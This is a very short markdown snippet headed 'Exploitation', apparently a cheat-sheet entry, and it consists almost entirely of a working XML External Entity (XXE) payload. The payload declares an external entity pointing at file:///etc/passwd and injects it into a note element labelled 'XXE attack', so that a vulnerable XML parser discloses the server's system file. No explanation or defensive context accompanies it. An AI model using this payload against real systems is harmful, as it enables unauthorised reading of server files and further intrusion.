#Exploitation

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [ 
	<!ELEMENT note ANY> 
	<!ENTITY sys SYSTEM "file:///etc/passwd"> 
]>  
<note>  
    <to>&sys;</to>  
    <from>feast</from>  
    <heading>hacking</heading>  
    <body>XXE attack</body>  
</note>
```


